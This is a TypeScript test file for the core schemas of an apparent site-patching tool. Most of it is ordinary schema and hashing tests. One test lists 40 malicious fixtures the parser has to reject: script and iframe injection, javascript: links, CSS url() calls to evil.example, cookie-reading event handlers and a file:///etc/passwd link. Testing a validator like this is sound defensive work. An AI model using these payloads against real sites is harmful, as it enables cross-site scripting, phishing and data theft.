import assert from "node:assert/strict";
import test from "node:test";
import {
  canonicalJson,
  auditEntrySchema,
  conflictSchema,
  healthEventSchema,
  manifestSchema,
  normalizePatch,
  parseSafeOperation,
  patchContentHash,
  patchOperationSchema,
  reviewSchema,
  siteSchema,
  verificationRunSchema,
} from "../packages/core/src/index";

const origin = "https://shopnest.example";
const target = {
  fingerprint: "fp_checkout_button_001",
  fallbackLabel: "Add to cart",
  expectedTag: "button",
  expectedRole: "button",
};

test("core schemas accept a coherent site and operation", () => {
  const site = siteSchema.parse({
    id: "site_shopnest",
    name: "ShopNest storefront",
    canonicalOrigin: origin,
    repository: "acme/shopnest",
    defaultBranch: "main",
    createdAt: "2026-10-10T08:00:00.000Z",
    owner: { id: "usr_maya", name: "Maya Singh", email: "maya@acme.example" },
  });
  assert.equal(site.name, "ShopNest storefront");
  const operation = patchOperationSchema.parse({
    id: "op_add_cart_style",
    kind: "style",
    target,
    property: "backgroundColor",
    value: "#171a1f",
  });
  assert.equal(operation.kind, "style");
});

test("core schemas reject invalid origins and malformed operations", () => {
  assert.throws(() => siteSchema.parse({
    id: "site_shopnest",
    name: "ShopNest",
    canonicalOrigin: `${origin}/checkout`,
    repository: "acme/shopnest",
    defaultBranch: "main",
    createdAt: "2026-10-10T08:00:00.000Z",
    owner: { id: "usr_maya", name: "Maya Singh", email: "maya@acme.example" },
  }));
  assert.throws(() => patchOperationSchema.parse({ id: "broken", kind: "style", target, property: "position", value: "fixed" }));
});

test("safe operation parsing rejects the malicious fixture suite with plain-English remediation", () => {
  const unsafeFixtures: readonly unknown[] = [
    { id: "bad-01", kind: "style", target, property: "color", value: "url(https://evil.example/steal)" },
    { id: "bad-02", kind: "style", target, property: "color", value: "URL(//evil.example/pixel)" },
    { id: "bad-03", kind: "style", target, property: "color", value: "@import 'https://evil.example/x.css'" },
    { id: "bad-04", kind: "style", target, property: "color", value: "expression(alert(1))" },
    { id: "bad-05", kind: "style", target, property: "color", value: "javascript:alert(1)" },
    { id: "bad-06", kind: "style", target, property: "color", value: "<style>body{display:none}</style>" },
    { id: "bad-07", kind: "style", target, property: "color", value: "{color:red}" },
    { id: "bad-08", kind: "style", target, property: "backgroundColor", value: "url(data:image/svg+xml,<svg/onload=alert(1)>)" },
    { id: "bad-09", kind: "style", target, property: "color", value: "linear-gradient(red, url(/secret))" },
    { id: "bad-10", kind: "style", target, property: "color", value: "-moz-binding:url(/x)" },
    { id: "bad-11", kind: "text", target, value: "<script>fetch('/secret')</script>" },
    { id: "bad-12", kind: "text", target, value: "<iframe src='https://evil.example'></iframe>" },
    { id: "bad-13", kind: "text", target, value: "<object data='payload'></object>" },
    { id: "bad-14", kind: "text", target, value: "<embed src='payload'>" },
    { id: "bad-15", kind: "text", target, value: "<SCRIPT SRC='https://evil.example/x.js'></SCRIPT>" },
    { id: "bad-16", kind: "text", target, value: "<iframe srcdoc='<script>alert(1)</script>'></iframe>" },
    { id: "bad-17", kind: "text", target, value: "<object type='text/html' data='x'>" },
    { id: "bad-18", kind: "text", target, value: "<embed type='application/x-shockwave-flash'>" },
    { id: "bad-19", kind: "attribute", target, name: "href", value: "javascript:alert(1)" },
    { id: "bad-20", kind: "attribute", target, name: "href", value: "JavaScript:fetch('/secret')" },
    { id: "bad-21", kind: "attribute", target, name: "href", value: "https://evil.example/phish" },
    { id: "bad-22", kind: "attribute", target, name: "href", value: "//evil.example/phish" },
    { id: "bad-23", kind: "attribute", target, name: "href", value: "data:text/html,<script>alert(1)</script>" },
    { id: "bad-24", kind: "attribute", target, name: "href", value: "http://evil.example/redirect" },
    { id: "bad-25", kind: "attribute", target, name: "href", value: "https://shopnest.example.evil.example/host" },
    { id: "bad-26", kind: "attribute", target, name: "href", value: "https://shopnest.example@evil.example/host" },
    { id: "bad-27", kind: "attribute", target, name: "href", value: "javascript://shopnest.example/%0aalert(1)" },
    { id: "bad-28", kind: "attribute", target, name: "href", value: "vbscript:msgbox(1)" },
    { id: "bad-29", kind: "attribute", target, name: "href", value: "file:///etc/passwd" },
    { id: "bad-30", kind: "attribute", target, name: "href", value: "blob:https://evil.example/id" },
    { id: "bad-31", kind: "attribute", target, name: "onclick", value: "fetch('/secret')" },
    { id: "bad-32", kind: "attribute", target, name: "onerror", value: "alert(1)" },
    { id: "bad-33", kind: "attribute", target, name: "onload", value: "location='https://evil.example'" },
    { id: "bad-34", kind: "attribute", target, name: "onmouseover", value: "document.cookie" },
    { id: "bad-35", kind: "badge", target, label: "<img src=x onerror=alert(1)>", tone: "danger" },
    { id: "bad-36", kind: "badge", target, label: "<script>alert(1)</script>", tone: "warning" },
    { id: "bad-37", kind: "style", target, property: "color", value: "a".repeat(17_000) },
    { id: "bad-38", kind: "text", target, value: "b".repeat(17_000) },
    { id: "bad-39", kind: "attribute", target, name: "title", value: "c".repeat(17_000) },
    { id: "bad-40", kind: "attribute", target, name: "data-testid", value: "d".repeat(1_001) },
  ];

  assert.equal(unsafeFixtures.length, 40);
  for (const fixture of unsafeFixtures) {
    assert.throws(() => parseSafeOperation(fixture, origin), /patch|operation|value|attribute|plain text|allowlisted|origin|JavaScript|larger than|markup/i);
  }
});

test("canonical patch normalization is stable and content hashes are SHA-256", async () => {
  const patch = {
    identity: { id: "patch_checkout", siteId: "site_shopnest", targetFingerprint: target.fingerprint, createdBy: "usr_maya" },
    revision: {
      revision: 1,
      baseManifestHash: `sha256-${"a".repeat(64)}`,
      contentHash: `sha256-${"b".repeat(64)}`,
      createdAt: "2026-10-10T08:00:00.000Z",
      author: { id: "usr_maya", name: "Maya Singh", email: "maya@acme.example" },
      message: "Restore checkout action",
    },
    title: "  Restore checkout action  ",
    description: " Replace the stale overlay. ",
    status: "draft" as const,
    operations: [{ id: "op-02", kind: "text" as const, target, value: "Add to cart" }, { id: "op-01", kind: "hide" as const, target, hidden: false }],
    dependencies: ["patch_b", "patch_a", "patch_a"],
    reviewers: [{ id: "usr_zoe", name: "Zoe Park", email: "zoe@acme.example" }, { id: "usr_maya", name: "Maya Singh", email: "maya@acme.example" }],
    tags: ["Checkout", "hotfix", "Checkout"],
    createdAt: "2026-10-10T08:00:00.000Z",
    updatedAt: "2026-10-10T08:00:00.000Z",
  };
  const normalized = normalizePatch(patch);
  assert.deepEqual(normalized.dependencies, ["patch_a", "patch_b"]);
  assert.deepEqual(normalized.tags, ["checkout", "hotfix"]);
  assert.equal(canonicalJson(normalized), canonicalJson(normalizePatch(patch)));
  assert.match(await patchContentHash(normalized), /^sha256-[a-f0-9]{64}$/);
  assert.ok(manifestSchema.safeParse({
    version: 1,
    siteId: "site_shopnest",
    releaseId: "rel_20261010_01",
    environment: "production",
    baseHash: `sha256-${"c".repeat(64)}`,
    patchHashes: [],
    createdAt: "2026-10-10T08:00:00.000Z",
    expiresAt: "2026-10-11T08:00:00.000Z",
    killSwitch: { enabled: false, reason: null, enabledAt: null, enabledBy: null },
  }).success);
});

test("review, conflict, verification, health, and audit evidence share typed boundaries", () => {
  const author = { id: "usr_maya", name: "Maya Singh", email: "maya@acme.example" };
  const timestamp = "2026-10-10T08:00:00.000Z";
  assert.ok(reviewSchema.safeParse({ id: "review_01", patchId: "patch_checkout", decision: "approved", author, note: "The target and rollback are clear.", createdAt: timestamp }).success);
  assert.ok(conflictSchema.safeParse({ id: "conflict_01", patchId: "patch_checkout", kind: "property", severity: "blocking", targetFingerprint: target.fingerprint, explanation: "Both revisions change the same color.", suggestedResolution: "Keep the reviewed production value.", leftRevision: 1, rightRevision: 2, resolvedAt: null, resolvedBy: null }).success);
  assert.ok(verificationRunSchema.safeParse({ id: "verify_01", patchId: "patch_checkout", environment: "preview", status: "passed", checks: [], startedAt: timestamp, finishedAt: timestamp }).success);
  assert.ok(healthEventSchema.safeParse({ id: "health_01", releaseId: "rel_01", type: "error_rate", status: "healthy", observedAt: timestamp, value: 0.02, threshold: 0.1, explanation: "Error rate remains below the release gate." }).success);
  assert.ok(auditEntrySchema.safeParse({ sequence: 0, id: "audit_01", action: "patch_created", actor: author, subjectId: "patch_checkout", timestamp, details: { message: "Created from scan finding." }, previousHash: null, entryHash: `sha256-${"e".repeat(64)}` }).success);
});
